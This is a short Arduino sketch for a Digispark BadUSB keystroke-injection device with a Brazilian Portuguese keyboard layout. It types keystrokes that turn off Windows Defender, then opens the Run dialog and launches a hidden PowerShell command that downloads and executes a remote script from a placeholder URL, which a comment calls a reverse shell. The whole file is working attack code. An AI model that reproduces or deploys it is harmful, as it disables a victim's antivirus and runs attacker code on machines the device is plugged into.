#include "DigiKeyboardPtBr.h"
void setup() {
}

void loop() {
    
// Disable Windows Defender
DigiKeyboardPtBr.sendKeyStroke(0, MOD_GUI_LEFT);
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.print("Defender");
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE);
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.print("\t\t\t\t\t");
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE);
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE);
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.print("\t");
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  
// Reverse Shell
DigiKeyboardPtBr.sendKeyStroke(0);
DigiKeyboardPtBR.delay(500);
DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboardPtBr.delay(500);
DigiKeyboardPtBr.println("powershell -windowsstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('URL_DO _CODIGO');\"");

  for (;;) {}
}
